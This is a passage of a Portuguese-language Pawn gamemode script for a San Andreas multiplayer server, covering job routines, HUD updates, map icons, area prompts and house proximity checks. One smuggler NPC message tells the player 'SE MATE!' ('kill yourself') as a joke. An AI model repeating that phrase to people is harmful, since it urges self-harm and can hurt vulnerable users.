	if(Area[playerid] != AREA_FARM)
	{
	    SendClientMessage(playerid, COLOUR_GRAY, "Colheita cancelada! Você saiu da área.");
	    return 1;
	}
	
	if(random(100) < 60)
	{
	    new corn;
	    
	    corn = 300 + random(701);
	    Corn[playerid] += corn << 1;
	    
		format(string, sizeof string, "ô Zé! A colheita e o ensacamento deu tudo certin (Milho +%dg), se ocê quiser continuar plantando, pode ficar.", corn);
		SendClientMessage(playerid, COLOUR_FARMER, string);
		SendClientMessage(playerid, COLOUR_FARMER, "Caso adverso, vá na fazenda e venda o milho.");
	
		corn = Corn[playerid] >> 1;
	
		if(corn < 1000)
			format(string, sizeof string, "Quantia de milho: %dg", corn);

		else
		    format(string, sizeof string, "Quantia de milho: %d,%dkg", corn / 1000, corn % 1000);

		SendClientMessage(playerid, COLOUR_FARMER, string);
	}
	
	else
	{
	    new money;

	 	money = (11 + random(40)) % 10;

		GivePlayerSysMoney(playerid, -money);
		format(string, sizeof string, "Eita! A colheita num deu certo e ocê recebeu um prejuízo de $%d,00 dólares.", money);
	    SendClientMessage(playerid, COLOUR_FARMER, string);
	    SendClientMessage(playerid, COLOUR_FARMER, "Mas ocê pode continuar plantando se quiser.");
	}
	
	return 1;
}

public Milking(playerid)
{
    new string[128];
    new milk;
    
    DeleteTimer(FarmerTimer[playerid]);
    
    for(new cow = 0; cow < sizeof Cows; cow++)
    {
        if(Cowboy[cow] == playerid)
        {
            Cowboy[cow] = INVALID_PLAYER_ID;
			break;
        }
    }
    
    milk = 200 + random(301);
    milk -= milk % 50;
	Milk[playerid] += milk;
	
	format(string, sizeof string, "Cê tirô %dml de leite, ocê pode continua pegando nas teta, ô caso adverso, se ocê tiver mais de um 1L,", milk);
    SendClientMessage(playerid, COLOUR_FARMER, string);
	SendClientMessage(playerid, COLOUR_FARMER, "ocê pode ir na fazenda e vender.");
	ApplyAnimation(playerid, "CAR", "Fixn_Car_Out", 4.1, 0, 1, 1, 1, -1, 1);
 	SetTimerEx("StopAnimation", 3000, false, "d", playerid);
 	
	if(Milk[playerid] < 1000)
		format(string, sizeof string, "Quantia de leite: %dml", Milk[playerid]);
		
	else
	    format(string, sizeof string, "Quantia de leite: %d,%dL", Milk[playerid] / 1000, Milk[playerid] % 1000);
	    
	SendClientMessage(playerid, COLOUR_FARMER, string);
}

public CheckingSmugglingCar(playerid)
{
	new rand;
	
	rand = random(3);
	
	if(rand < 2)
	{
	    rand = random(sizeof SmugglingCarPlaces);
	    SetPlayerRaceCheckpoint(playerid, 1, SmugglingCarPlaces[rand][0], SmugglingCarPlaces[rand][1], SmugglingCarPlaces[rand][2], 0.0, 0.0, 0.0, 4.0);
	    SendClientMessage(playerid, COLOUR_SMUGGLER, "Beleza, vou querer o carro, agora leve para o destino que lhe passarei.");
	}
	
	else
	{
	    Smuggling[playerid] = 0;
	    SmugglingPart[playerid] = 0;
	    SendClientMessage(playerid, COLOUR_SMUGGLER, "Não vou querer! Deixe para a próxima.");
	    SendClientMessage(playerid, COLOUR_SMUGGLER, "A cor não me agradou. Se achou ruim, SE MATE!");
	}
	
	TogglePlayerControllable(playerid, true);
}

public WaitingLimo(playerid, action)
{
    new string[128];
	new pay, vehicleid;
	new Float:H;
	
	vehicleid = GetPlayerVehicleID(playerid);
	
	if(!IsJobVehicle(vehicleid, STRETCH))
	    return;
	    
	pay = 200 + random(201);
	pay -= pay % 10;
	
	if(action == 1)
	{
	    Pay(playerid, pay);
	    format(string, sizeof string, "Limosine limpa, a companhia lhe pagou $%d,00 dólares.", pay);
	    SendClientMessage(playerid, COLOUR_DRIVER, string);
	    return;
	}
	
	GetVehicleHealth(vehicleid, H);
		
	if(H <= 800.0)
	{
	    pay -= 300;
	    SendClientMessage(playerid, COLOUR_DRIVER, "Limosine em péssimo estado, vai receber menos para cobrir o conserto. (-$300,00 dólares)");
	}
		
	else if(H <= 900.0)
	{
	    pay -= 100;
	    SendClientMessage(playerid, COLOUR_DRIVER, "Limosine em estado mediano, nada que uns $100,00 dólares não arrumem. (-$100,00 dólares)");
	}

	else
 		SendClientMessage(playerid, COLOUR_DRIVER, "Limosine em perfeito estado, isto que é ter cuidado hein?!");

	if(pay > 0)
	{
	    Pay(playerid, pay);
		format(string, sizeof string, "Você recebeu $%d,00 dólares.", pay);
		SendClientMessage(playerid, COLOUR_DRIVER, string);
	}

	else
	    SendClientMessage(playerid, COLOUR_DRIVER, "Você pagou o conserto e não sobrou nada pra você! ='(");
		    
	SetVehicleHealth(vehicleid, 1000.0);
 	RepairVehicle(vehicleid);
}

public LoadingTruck(playerid)
{
	new rand;
	new Float:X, Float:Y, Float:Z;
	
	rand = random(3);
	
	if(rand == 0)
	    X = -2431.3088, Y = 2314.9201, Z = 4.9843;
	    
	if(rand == 1)
	    X = 1049.5113, Y = 2088.2636, Z = 10.8203;
	    
	if(rand == 2)
	    X = -2091.7419, Y = -2243.3479, Z = 30.8439;
	    
	TogglePlayerControllable(playerid, true);
    SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 4.0);
    DrawTextForPlayer(playerid, "Trailer abastecido, entregue ao destino.", COLOUR_TRUCKER, TEXTDRAW_STYLE_2, 3000);
}

public BusStop(playerid)
{
    new terminal, route;
	new Float:X, Float:Y;

	terminal = -1;
	route = BusTerminals[Terminal[playerid] - 1][btRoute];
	
	for(new bt = Terminal[playerid]; bt < sizeof BusTerminals; bt++)
	{
		if(BusTerminals[bt][btRoute] == route)
		{
		    terminal = bt;
		    break;
		}
	}
	
	if(terminal == -1)
	{
	    for(new bt = 0; bt < Terminal[playerid]; bt++)
	    {
	        if(BusTerminals[bt][btRoute] == route)
	        {
	            terminal = bt;
	            break;
			}
	    }
	    
	    Pay(playerid, 200);
	    DrawTextForPlayer(playerid, "Rota concluída, você recebeu $200,00 dólares.", COLOUR_MACHINIST, TEXTDRAW_STYLE_2, 5000);
	}
	
	else
	    DrawTextForPlayer(playerid, "Prossiga para o próximo terminal...", COLOUR_MACHINIST, TEXTDRAW_STYLE_2, 3000);

	if(terminal != -1)
	{
		X = BusTerminals[terminal][btX] + (5.0 * floatsin(-(BusTerminals[terminal][btRZ] + 90.0), degrees));
		Y = BusTerminals[terminal][btY] + (5.0 * floatcos(-(BusTerminals[terminal][btRZ] + 90.0), degrees));

		Terminal[playerid] = terminal + 1;
		TogglePlayerControllable(playerid, true);
		SetPlayerRaceCheckpoint(playerid, 1, X, Y, BusTerminals[terminal][btZ], 0.0, 0.0, 0.0, 5.0);
	}
}

public DiscoDJ()
{
	new playerid;

    playerid = Submission[SUBMISSION_DJ];
	DeleteTimer(DiscoTimer);
	
	if(playerid == INVALID_PLAYER_ID)
	    return;
	    
	GivePlayerSysMoney(playerid, 10);
	SendClientMessage(playerid, COLOUR_DJ, "Você recebeu $10,00 dólares, continue...");
}

public FunkDJ()
{
	new playerid;

    playerid = Submission[SUBMISSION_FUNKDJ];
	DeleteTimer(FunkTimer);

	if(playerid == INVALID_PLAYER_ID)
	    return;

	GivePlayerSysMoney(playerid, 10);
	SendClientMessage(playerid, COLOUR_DJ, "Você recebeu $10,00 dólares, continue...");
}

public PlacingBodies()
{
	new playerid;
	
    playerid = Submission[SUBMISSION_IML];

	if(playerid == INVALID_PLAYER_ID)
	    return;
	    
	if(Bodies & 0x1)
	{
	    if(Bodies > 6)
	    {
	        new string[128];
	        new pay;

			pay = (random(101) + 50);
			pay -= (pay % 5);

            GivePlayerSysMoney(playerid, pay);
            format(string, sizeof string, "Corpos enterrados, você recebeu $%d,00 dólares.", pay);
			SendClientMessage(playerid, COLOUR_IML, string);
	    }

	    Bodies &= ~0x1;
	    TogglePlayerControllable(playerid, true);
	    SetPlayerRaceCheckpoint(playerid, 1, 1184.0129, -1323.1227, 13.1519, 0.0, 0.0, 0.0, 4.0);
	    SendClientMessage(playerid, COLOUR_IML, "Vá para o hospital buscar mais corpos.");
	    return;
	}
	
	Bodies = (Bodies + 0x2) | 0x1;
    TogglePlayerControllable(playerid, true);
    SetPlayerRaceCheckpoint(playerid, 1, 940.2975, -1087.1194, 23.8630, 0.0, 0.0, 0.0, 4.0);
    SendClientMessage(playerid, COLOUR_IML, "Corpos colocados, agora leve-os ao cemitério.");
}

public UnloadingCement()
{
    new playerid;

    playerid = Submission[SUBMISSION_POST];

	if(playerid == INVALID_PLAYER_ID)
	    return;
	    
    TogglePlayerControllable(playerid, true);
    SetPlayerRaceCheckpoint(playerid, 1, 2413.6775, -2470.0376, 13.1957, 0.0, 0.0, 0.0, 4.0);
    SendClientMessage(playerid, COLOUR_IML, "Cimento descarregado, volte para a cimentaria.");
}

public FixingPost()
{
	new string[128];
	new playerid, place;

	playerid = Submission[SUBMISSION_POST];

	if(playerid == INVALID_PLAYER_ID)
	    return;

    Posts--;
    SendClientMessage(playerid, COLOUR_POST, "Manutenção concluída!");

	if(Posts <= 0)
    {
        new pay;

		pay = (random(101) + 50);
		pay -= (pay % 5);

		GivePlayerSysMoney(playerid, pay);
        SetPlayerRaceCheckpoint(playerid, 1, 2270.4401, -1033.6555, 51.8252, 0.0, 0.0, 0.0, 4.0);
        format(string, sizeof string, "Postes arrumados, você recebeu $%d,00 dólares.", pay);
        SendClientMessage(playerid, COLOUR_POST, string);
        SendClientMessage(playerid, COLOUR_POST, "Volte para a companhia elétrica para arrumar mais.");
        return;
    }

	place = random(sizeof PostPlaces);
	TogglePlayerControllable(playerid, true);
	SetPlayerRaceCheckpoint(playerid, 1, PostPlaces[place][0], PostPlaces[place][1], PostPlaces[place][2], 0.0, 0.0, 0.0, 4.0);
	SendClientMessage(playerid, COLOUR_POST, "Vá arrumar o próximo poste.");
}

public Resume(playerid)
{
	new vehid;
	
	if(IsPlayerConnected(playerid) && IsPlayerLogged(playerid))
	{
	    vehid = INVALID_VEHICLE_ID;

		if(IsPlayerInAnyVehicle(playerid))
	    	vehid = GetPlayerVehicleID(playerid);
	    
	    if(Transport[playerid] != 0 && (!IsTrailerAttachedToVehicle(vehid) || GetJobVehicle(GetVehicleTrailer(vehid), TRAILER) != Transport[playerid] - 1))
	    {
	        Transport[playerid] = 0;
			MetersTraveled[playerid] = 0;
	        DisablePlayerRaceCheckpoint(playerid);
	    	SendClientMessage(playerid, COLOUR_TRUCKER, "Transporte cancelado, você não retornou ao caminhão.");
	    	DrawTextForPlayer(playerid, "Transporte cancelado.", COLOUR_TRUCKER, TEXTDRAW_STYLE_2, 3000);
		}
		
		if(Terminal[playerid] != 0 && !IsJobVehicle(vehid, BUS))
		{
			Terminal[playerid] = 0;
			DisablePlayerRaceCheckpoint(playerid);
			SendClientMessage(playerid, COLOUR_MACHINIST, "Rota cancelada, você não retornou ao ônibus.");
	    	DrawTextForPlayer(playerid, "Rota cancelada.", COLOUR_MACHINIST, TEXTDRAW_STYLE_2, 3000);
		}
		
		if(TaxiDelivery[playerid] != -1 && !IsJobVehicle(vehid, TAXI))
		{
			TaxiDelivery[playerid] = -1;
			DisablePlayerRaceCheckpoint(playerid);
			SendClientMessage(playerid, COLOUR_CABBIE, "Entregas canceladas, você não retornou ao taxi.");
  			DrawTextForPlayer(playerid, "Entregas automáticas canceladas", COLOUR_CABBIE, TEXTDRAW_STYLE_2, 3000);
		}
		
		if(Corn[playerid] & 0x1 && (!IsJobVehicle(vehid, FARM) || GetVehicleModel(vehid) != 532))
		{
		    Corn[playerid] &= ~1;
		    DeleteTimer(FarmerTimer[playerid]);
		    SendClientMessage(playerid, COLOUR_FARMER, "Plantio cancelado, você não retornou a combine.");
		    DrawTextForPlayer(playerid, "Plantio cancelado", COLOUR_FARMER, TEXTDRAW_STYLE_2, 3000);
		}
		
		if(Pouch[playerid] != -1 && !IsJobVehicle(vehid, SECURITY))
		{
			Pouch[playerid] = -1;
		    SendClientMessage(playerid, COLOUR_SECURITY, "Transporte cancelado, você não retornou ao carro forte.");
		    DrawTextForPlayer(playerid, "Transporte cancelado", COLOUR_SECURITY, TEXTDRAW_STYLE_2, 3000);
		}
		
		if(Submission[SUBMISSION_ICE_CREAM] == playerid && vehid != ICE_CREAM)
		{
		    Submission[SUBMISSION_ICE_CREAM] = INVALID_PLAYER_ID;
		    DisablePlayerRaceCheckpoint(playerid);
  			SendClientMessage(playerid, COLOUR_ICE_CREAM, "Entregas canceladas, você não retornou ao carro de sorvete.");
	    	DrawTextForPlayer(playerid, "Entregas canceladas", COLOUR_ICE_CREAM, TEXTDRAW_STYLE_2, 3000);
		}
		
		if(Submission[SUBMISSION_CEMENT] == playerid && vehid != CEMENT)
		{
		    Submission[SUBMISSION_CEMENT] = INVALID_PLAYER_ID;
		    DisablePlayerRaceCheckpoint(playerid);
  			SendClientMessage(playerid, COLOUR_CEMENT, "Transporte cancelado, você não retornou ao caminhão de cimento.");
	    	DrawTextForPlayer(playerid, "Transporte cancelado", COLOUR_CEMENT, TEXTDRAW_STYLE_2, 3000);
		}
		
		if(Submission[SUBMISSION_IML] == playerid && vehid != IML)
		{
		    Submission[SUBMISSION_IML] = INVALID_PLAYER_ID;
		    DisablePlayerRaceCheckpoint(playerid);
  			SendClientMessage(playerid, COLOUR_IML, "Transporte cancelado, você não retornou ao carro funerário.");
	    	DrawTextForPlayer(playerid, "Transporte cancelado", COLOUR_IML, TEXTDRAW_STYLE_2, 3000);
		}
		
		if(Submission[SUBMISSION_POST] == playerid && vehid != POST)
		{
		    Submission[SUBMISSION_POST] = INVALID_PLAYER_ID;
		    DisablePlayerRaceCheckpoint(playerid);
  			SendClientMessage(playerid, COLOUR_POST, "Manutenção cancelada, você não retornou ao carro de eletricidade.");
	    	DrawTextForPlayer(playerid, "Manutenção cancelada", COLOUR_POST, TEXTDRAW_STYLE_2, 3000);
		}
	}
	
	DeleteTimer(ResumeTimer[playerid]);
}

stock HidePlayerFuelText(playerid)
{
	if(VFuelText[playerid] == -1)
	    return;
	    
    TextDrawHideForPlayer(playerid, tdgasmeter[VFuelText[playerid]]);
    VFuelText[playerid] = -1;
}

stock UpdatePlayerFuelText(playerid)
{
	new fuel;
	
	if(IsPlayerInAnyVehicle(playerid))
	{
		if(!IsRCModel(GetVehicleModel(GetPlayerVehicleID(playerid))))
	    	fuel = GetVehicleFuel(GetPlayerVehicleID(playerid));
	    
	    else
	        fuel = hGetInt(GetPlayerXFilePath(playerid), "Battery");
	    
		if(fuel < 0)
		    fuel = 0;
		    
		if(fuel >= sizeof tdgasmeter)
	    	fuel = sizeof tdgasmeter - 1;
	    
	    if(VFuelText[playerid] == fuel)
	        return;
	        
        HidePlayerFuelText(playerid);
		TextDrawShowForPlayer(playerid, tdgasmeter[fuel]);
 		VFuelText[playerid] = fuel;
	}
	
	else
	    HidePlayerFuelText(playerid);
}

stock UpdatePlayerHealthText(playerid)
{
	new colour;
	new Float:health;
	
	TextDrawHideForPlayer(playerid, tdhealthbar[playerid]);
	
	if(IsPlayerInAnyVehicle(playerid))
	{
	    GetVehicleHealth(GetPlayerVehicleID(playerid), health);
	    
	    if(health < 250.0)
	        health = 250.0;
	        
	    colour = RGBA(floatround((1000.0 - health) / 2.94117647), floatround((health - 250.0) / 2.94117647), 0x00, 0x77);
 		TextDrawBoxColour(tdhealthbar[playerid], colour);
    	TextDrawTextSize(tdhealthbar[playerid], 218.0 + (0.133333333 * (health - 250.0)), 0.0);
    	TextDrawShowForPlayer(playerid, tdhealthbar[playerid]);
    	VHealthText[playerid] = floatround(health);
	}
}

public GeneralHandler()
{
	new Float:X, Float:Y, Float:Z;
	
    for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n))
	    {
	        new mi;

            mi = 0;
	        GetPlayerPos(n, X, Y, Z);
			    
	        for(new x = 0; x < MAX_MAP_ICONS; x++)
			    RemovePlayerMapIcon(n, x);

			for(new area = 0; area < sizeof Areas; area++)
			{
			    if(mi >= MAX_MAP_ICONS)
			        break;

                if(Areas[area][areaMapIconId] != 0)
			    {
			    	if(GetDistance(X, Y, Z, Areas[area][areaX], Areas[area][areaY], Areas[area][areaZ]) < MAP_ICON_RADIUS)
			    	{
			        	SetPlayerMapIcon(n, mi, Areas[area][areaX], Areas[area][areaY], Areas[area][areaZ], Areas[area][areaMapIconId], 0xE6E6E6E6);
						mi++;
					}
				}
			}

			for(new company = 1; company < sizeof Companies; company++)
			{
			    if(mi >= MAX_MAP_ICONS)
			        break;

                if(Companies[company][cMapIconId] != 0)
			    {
			    	if(GetDistance(X, Y, Z, Companies[company][cX], Companies[company][cY], Companies[company][cZ]) < MAP_ICON_RADIUS)
			    	{
			        	SetPlayerMapIcon(n, mi, Companies[company][cX], Companies[company][cY], Companies[company][cZ], Companies[company][cMapIconId], 0xE6E6E6E6);
						mi++;
					}
				}
			}

			for(new enter = 0; enter < sizeof Enters; enter++)
			{
			    if(mi >= MAX_MAP_ICONS)
			        break;

			    new int;

				int = Enters[enter][intId];

                if(Ints[int][intMapIconId] != 0)
			    {
			    	if(GetDistance(X, Y, Z, Enters[enter][enterX], Enters[enter][enterY], Enters[enter][enterZ]) < MAP_ICON_RADIUS)
			    	{
			        	SetPlayerMapIcon(n, mi, Enters[enter][enterX], Enters[enter][enterY], Enters[enter][enterZ], Ints[int][intMapIconId], 0xE6E6E6E6);
						mi++;
					}
				}
			}
			
			for(new radar = 0; radar < sizeof Radar; radar++)
			{
			    if(mi >= MAX_MAP_ICONS)
			        break;
			        
				if(GetDistance(X, Y, Z, Radar[radar][rdX], Radar[radar][rdY], Radar[radar][rdZ]) < MAP_ICON_RADIUS)
				{
				    SetPlayerMapIcon(n, mi, Radar[radar][rdX], Radar[radar][rdY], Radar[radar][rdZ], 53, 0xE6E6E6E6);
				    mi++;
				}
			}
			
			for(new house = 0; house < GetHouses(); house++)
			{
				new Float:HX, Float:HY, Float:HZ, Float:HA;
				
			    if(mi >= MAX_MAP_ICONS)
			        break;
			        
				LoadHousePos(house, HX, HY, HZ, HA);
				
				if(GetDistance(X, Y, Z, HX, HY, HZ) < MAP_ICON_RADIUS)
				{
				    SetPlayerMapIcon(n, mi, HX, HY, HZ, 32, 0xE6E6E6E6);
				    mi++;
				}
			}

//ÁREAS

	        if(IsPlayerInAnyVehicle(n))
	        {
	            if(Door[n] != -1)
	            {
	            	Door[n] = -1;
	            	TextDrawHideForPlayer(n, tdjoin);
				}
	        }

	        else
	        {
				if(Door[n] != -1)
				{
				    if(GetDistance(X, Y, Z, Enters[Door[n]][enterX], Enters[Door[n]][enterY], Enters[Door[n]][enterZ]) > 2.5)
				    {
				        Door[n] = -1;
				        TextDrawHideForPlayer(n, tdjoin);
					}
				}

				else
				{
				    for(new e = 0; e < sizeof Enters; e++)
				    {
				        if(GetDistance(X, Y, Z, Enters[e][enterX], Enters[e][enterY], Enters[e][enterZ]) <= 2.5)
				        {
				            Door[n] = e;
				            TextDrawShowForPlayer(n, tdjoin);
				            PlayerPlaySound(n, 1139, 0.0, 0.0, 0.0);
						}
				    }
				}

                TextDrawHideForPlayer(n, tdexit);
                
				if(Enter[n] != -1)
				{
			    	new int;

					int = Enters[Enter[n]][intId];

					if(GetDistance(X, Y, Z, Ints[int][intX], Ints[int][intY], Ints[int][intZ]) <= 2.5)
       				   	TextDrawShowForPlayer(n, tdexit);
				}
				
				else
				{
				    for(new int = INT_ACCESS1; int < INT_ACCESS5 + 1; int++)
				    {
				        if(GetDistance(X, Y, Z, Ints[int][intX], Ints[int][intY], Ints[int][intZ]) <= 2.5)
						{
						    for(new enter = 0; enter < sizeof Enters; enter++)
						    {
						        if(Enters[enter][intId] == int)
						        {
						            Enter[n] = enter;
						            break;
						        }
						    }
						    
           				    TextDrawShowForPlayer(n, tdexit);
           				    break;
           				}
				    }
				}
	        }
	        
	        if(Company[n] == 0)
        	{
        		for(new c = 1; c < sizeof Companies; c++)
        		{
    	    	    if(GetDistance(X, Y, Z, Companies[c][cX], Companies[c][cY], Companies[c][cZ]) <= 10.0)
	        	    {
	        	        new string[128], OPT[4][64];
						new jobid;
						new bool:buy;
						
	        	        Company[n] = c;
	        	        jobid = Companies[c][cJob];
	        	        buy = false;

						if(hGetInt(GetPlayerXFilePath(n), "Job") == jobid)
						    break;

	       		        OPT[0] = (Companies[c][cValue] <= 0) ? ("Sim") : ("Não");
	   	    	        OPT[1] = (Jobs[jobid][jobHabT] == 1) ? ("Sim") : ("Não");
	        	        OPT[2] = (Jobs[jobid][jobHabN] == 1) ? ("Sim") : ("Não");
	        	        OPT[3] = (Jobs[jobid][jobHabA] == 1) ? ("Sim") : ("Não");

	       		        format(string, sizeof string, "------ [ %s \"%s\" ] ------", Companies[c][cType], Companies[c][cName]);
	       		        SendClientMessage(n, COLOUR_LIGHT_YELLOW, string);
	       		        format(string, sizeof string, "[INFORMACOES] Emprego: %s - Salário: $%d,00 dólares - Público: %s - Tempo de contrato: 120 minutos (2h reais)", Jobs[jobid][jobName], Jobs[jobid][jobPayday], OPT[0]);
	       		        SendClientMessage(n, COLOUR_WHITE, string);
	       		        
	       		        if(Companies[c][cValue] > 0)
	       		        {
	       		            new cpath[128], owner[128];
	       		            new value;
	       		            
	       		            cpath = GetCompanyFilePath(c);
	       		            owner = hGetString(cpath, "Owner");
	       		            value = Companies[c][cValue];
							buy = true;
							
							if(strlen(owner) > 0)
							{
				    			if(hGetInt(cpath, "Value") <= 0)
				        			buy = false;

								else
				    				value = hGetInt(cpath, "Value");
				    			
							}
							
							else
							    owner = ("Nenhum");
				
	       		            format(string, sizeof string, "[INFORMACOES] Dono: %s - Empresa avaliada em $%d,00 dólares", owner, value);
	       		        	SendClientMessage(n, COLOUR_WHITE, string);
	       		        }
	       		        
	       		        format(string, sizeof string, "[REQUISITOS] Experiência profissional: %d - Habilitação terrestre: %s - Habilitação naútica: %s - Habilitação aérea: %s", Jobs[jobid][jobLevel], OPT[1], OPT[2], OPT[3]);
	   	    	        SendClientMessage(n, COLOUR_WHITE, string);
	        	        SendClientMessage(n, COLOUR_LIGHT_YELLOW, "Para assinar um contrato com a empresa digite /assinar");
	        	        
	        	        if(buy)
	        	            SendClientMessage(n, COLOUR_LIGHT_YELLOW, "Para comprar a empresa digite /empresa comprar");
	        	            
	        	        break;
	            	}
	        	}
			}

			else
			{
			    if(GetDistance(X, Y, Z, Companies[Company[n]][cX], Companies[Company[n]][cY], Companies[Company[n]][cZ]) > 10.0)
			        Company[n] = 0;
			}

	        if(Area[n] != AREA_NULL)
	        {
	            new bool:area;

	            area = false;

	            for(new a = 0; a < sizeof Areas; a++)
	            {
					if(!area && Areas[a][areaId] == Area[n])
					{
	                	if(GetDistance(X, Y, Z, Areas[a][areaX], Areas[a][areaY], Areas[a][areaZ]) < Areas[a][areaRadi])
	                	    area = true;
					}
	            }

	            if(!area)
					Area[n] = AREA_NULL;
	        }

	        else
	        {
	            for(new a = 0; a < sizeof Areas; a++)
	            {
            		if(GetDistance(X, Y, Z, Areas[a][areaX], Areas[a][areaY], Areas[a][areaZ]) < Areas[a][areaRadi])
            		{
            		    Area[n] = Areas[a][areaId];

						if(Area[n] == AREA_CUSTOM_SHOP)
            		        DrawTextForPlayer(n, "Uso: ~b~~h~/oficina ~w~para customizar ~n~seu veículo", COLOUR_WHITE, TEXTDRAW_STYLE_7, 4000);

						else if(Area[n] == AREA_MOD_SHOP)
						{
						    new msg[128];
						    format(msg, sizeof msg, "Pressione ~b~~h~%s ~w~para modificar ~n~seu veículo", GetKeyName(K_MODSHOP, 0));
            		        DrawTextForPlayer(n, msg, COLOUR_WHITE, TEXTDRAW_STYLE_7, 4000);
						}
						
						else if(Area[n] == AREA_GAS_STATION)
							DrawTextForPlayer(n, "Uso: ~g~/abastecer ~w~para ~n~abastecer seu veículo~n~~g~/galao ~w~para adquirir um ~n~galão de combustível", COLOUR_WHITE, TEXTDRAW_STYLE_7, 4000);

						else if(Area[n] == AREA_HABT)
						    DrawTextForPlayer(n, "Uso: ~r~/teste ~w~para realizar~n~o teste de habilitação~n~~y~Valor: $800,00 dólares", COLOUR_WHITE, TEXTDRAW_STYLE_7, 4000);
						    
                        else if(Area[n] == AREA_HABN)
						    DrawTextForPlayer(n, "Uso: ~r~/teste ~w~para realizar~n~o teste de habilitação~n~~y~Valor: $1500,00 dólares", COLOUR_WHITE, TEXTDRAW_STYLE_7, 4000);
						    
                        else if(Area[n] == AREA_HABA)
						    DrawTextForPlayer(n, "Uso: ~r~/teste ~w~para realizar~n~o teste de habilitação~n~~y~Valor: $2400,00 dólares", COLOUR_WHITE, TEXTDRAW_STYLE_7, 4000);
						
						PlayerPlaySound(n, 1139, 0.0, 0.0, 0.0);
            		    break;
					}
	            }
	        }

//AMBIENCE SOUNDS

            if(AmbienceSound[n] != -1)
	        {
				if(GetDistance(X, Y, Z, AmbienceSounds[AmbienceSound[n]][asX], AmbienceSounds[AmbienceSound[n]][asY], AmbienceSounds[AmbienceSound[n]][asZ]) > AmbienceSounds[AmbienceSound[n]][asRadi])
				{
					AmbienceSound[n] = -1;
                    StopAudioStreamForPlayer(n);
				}
	        }
	        
	        else
	        {
				for(new s = 0; s < sizeof AmbienceSounds; s++)
				{
				    if(GetDistance(X, Y, Z, AmbienceSounds[s][asX], AmbienceSounds[s][asY], AmbienceSounds[s][asZ]) < AmbienceSounds[s][asRadi])
     				{
						AmbienceSound[n] = s;
						StopAudioStreamForPlayer(n);
						PlayAudioStreamForPlayer(n, AmbienceSounds[s][asURL], AmbienceSounds[s][asX], AmbienceSounds[s][asY], AmbienceSounds[s][asZ], AmbienceSounds[s][asRadi], 1);
     				}
				}
			}
			
//TERMINALS

			if(GetPlayerState(n) == PLAYER_STATE_ONFOOT && Dying[n] == 0 && TerminalCounter[n] <= 0)
			{
			    new info[128];
			    new bus;
				new Float:dis;
				
			    for(new bt = 0; bt < sizeof BusTerminals; bt++)
			    {
			        dis = GetDistance(X, Y, Z, BusTerminals[bt][btX], BusTerminals[bt][btY], BusTerminals[bt][btZ]);
			        
			        if(dis <= 10.0)
			        {
						for(new x = 0; x < MAX_SLOTS; x++)
						{
						    if(IsPlayerConnected(x) && IsPlayerLogged(x) && GetPlayerState(x) == PLAYER_STATE_DRIVER)
						    {
						        if(IsPlayerInJobVehicle(x, BUS) && Terminal[x] != 0 && BusTerminals[Terminal[x] - 1][btRoute] == BusTerminals[bt][btRoute])
							        bus++;
						    }
						}
						    
			            SendClientMessage(n, COLOUR_WHITE, "[=====================================================================]");
			            format(info, sizeof info, "Terminal de Ônibus - Ponto: %s", BusTerminals[bt][btRef]);
			            SendClientMessage(n, COLOUR_WHITE, info);
			            format(info, sizeof info, "Õnibus em circulação nessa rota: %d", bus);
			            SendClientMessage(n, COLOUR_WHITE, info);
			            SendClientMessage(n, COLOUR_WHITE, "Próximos pontos a partir deste:");

			            for(new nbt = bt + 1; nbt < sizeof BusTerminals; nbt++)
						{
							if(BusTerminals[nbt][btRoute] == BusTerminals[bt][btRoute])
								SendClientMessage(n, COLOUR_WHITE, BusTerminals[nbt][btRef]);
						}

						for(new nbt = 0; nbt < bt; nbt++)
						{
						    if(BusTerminals[nbt][btRoute] == BusTerminals[bt][btRoute])
								SendClientMessage(n, COLOUR_WHITE, BusTerminals[nbt][btRef]);
						}
						
			            SendClientMessage(n, COLOUR_WHITE, "[=====================================================================]");
			            TerminalCounter[n] = 30;
			            break;
			        }
			    }
			}

//DROPPED WEAPONS

			if(IsPlayerInAnyVehicle(n) || Dying[n] != 0)
	    	{
	    	    if(DroppedWeapon[n] != -1)
	    	    {
	    	        DroppedWeapon[n] = -1;
	    	        TextDrawHideForPlayer(n, tdgun);
	    	    }
	    	}

	    	else
	    	{
		    	new dw;
		    	new Float:OX, Float:OY, Float:OZ, Float:dis;

		    	if(DroppedWeapon[n] != -1)
		    	{
		    	    dw = DroppedWeapon[n];
		    	    GetObjectPos(DroppedWeapons[dw][dwObjectId], OX, OY, OZ);

		    	    dis = GetDistance(X, Y, Z, OX, OY, OZ);

			        if(dis > DROPPED_WEAPON_DISTANCE)
			        {
			            DroppedWeapon[n] = -1;
				        TextDrawHideForPlayer(n, tdgun);
			        }
			    }

			    else
			    {
			    	dw = -1;
			    	dis = DROPPED_WEAPON_DISTANCE;

			    	for(new id = 0; id < MAX_DROPPED_WEAPONS; id++)
			    	{
			    	    if(DroppedWeapons[id][dwExist] == 1)
			    	    {
			    	        new Float:odis;

				            GetObjectPos(DroppedWeapons[id][dwObjectId], OX, OY, OZ);

				            odis = GetDistance(X, Y, Z, OX, OY, OZ);

							if(odis <= dis)
							{
							    dw = id;
							    dis = odis;
							}
				        }
				    }

				    if(dw != -1)
				    {
				        DroppedWeapon[n] = dw;
				        TextDrawShowForPlayer(n, tdgun);
				    }
				}
			}
			
//HOUSES

			if(GetPlayerInterior(n) == 0)
	        {
	            new hpath[128];
	            new Float:HX, Float:HY, Float:HZ, Float:HA, Float:dis;

				if(House[n] != -1)
				{
					LoadHousePos(House[n], HX, HY, HZ, HA);

					dis = GetDistance(X, Y, Z, HX, HY, HZ);

					if(dis > HOUSE_RADIUS)
					{
					    House[n] = -1;
						TextDrawHideForPlayer(n, tdjoin);
						TextDrawHideForPlayer(n, tdhouse[n]);
					}
				}

				else
				{
	        		dis = HOUSE_RADIUS;

					for(new id = 0; id < GetHouses(); id++)
					{
	        		    hpath = GetHouseFilePath(id);

			            if(hGetInt(hpath, "Deleted") == 0)
			            {
			                new Float:hdis;

		                    LoadHousePos(id, HX, HY, HZ, HA);

		                    hdis = GetDistance(X, Y, Z, HX, HY, HZ);

							if(hdis <= dis)
							{
							    House[n] = id;
							    dis = hdis;
							}
		            	}
					}

					if(House[n] != -1)
					{
						new msg[128];
					    new onsale;

					    hpath = GetHouseFilePath(House[n]);
					    onsale = hGetInt(hpath, "OnSale");

					    if(onsale != 2)
					    {
					        new OS[128];
